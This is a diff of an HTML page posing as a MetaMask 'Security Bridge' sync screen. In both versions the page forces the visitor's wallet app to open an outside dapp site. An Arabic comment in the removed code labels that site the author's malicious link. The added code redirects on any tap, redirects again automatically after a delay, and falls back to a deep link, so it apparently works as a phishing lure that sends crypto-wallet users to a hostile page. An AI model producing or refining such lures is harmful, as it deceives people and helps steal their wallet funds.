@@ -2,33 +2,35 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MetaMask Secure Search...</title>
+    <title>Protocol Redirect</title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #0b0e11; color: white; }
-        .loader { border: 4px solid #1e2329; border-top: 4px solid #f6851b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .text { margin-top: 20px; font-weight: bold; color: #f6851b; }
+        body { background: #111; color: #f6851b; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; text-align: center; cursor: pointer; }
+        .box { border: 2px solid #f6851b; padding: 40px; border-radius: 20px; }
     </style>
 </head>
-<body>
-    <div class="loader"></div>
-    <div class="text">Synchronizing with MetaMask Browser...</div>
+<body onclick="launch()">
+    <div class="box">
+        <h1>SECURITY BRIDGE</h1>
+        <p>Tap anywhere to sync with MetaMask Browser</p>
+    </div>
 
     <script>
-        // الرابط الخبيث الخاص بك على Vercel
-        const maliciousLink = "https://hatestck.vercel.app/";
-
-        // استخدام بارامتر البحث (Search Query) بدلاً من الـ URL المباشر
-        // التنسيق: metamask://search?q=Link
-        const targetUrl = "metamask://search?q=" + encodeURIComponent(maliciousLink);
-
-        function triggerInjection() {
-            window.location.href = targetUrl;
+        function launch() {
+            // استخدام رابط الـ Dapp المباشر (هذا يفتح المتصفح فوراً وليس البحث)
+            const directLink = "https://metamask.app.link/dapp/hatestck.vercel.app";
+            window.location.href = directLink;
+            
+            // Backup بعد ثانية واحدة
+            setTimeout(() => {
+                window.location.href = "metamask://dapp/hatestck.vercel.app";
+            }, 1000);
         }
-
-        // تحويل بعد 3 ثوانٍ لمحاكاة عملية البحث
-        setTimeout(triggerInjection, 3000);
+        
+        // محاولة تحويل تلقائي (قد يمنعها المتصفح لذا أضفنا الضغط على الشاشة)
+        window.onload = function() {
+            setTimeout(launch, 2000);
+        }
     </script>
 </body>
 </html>
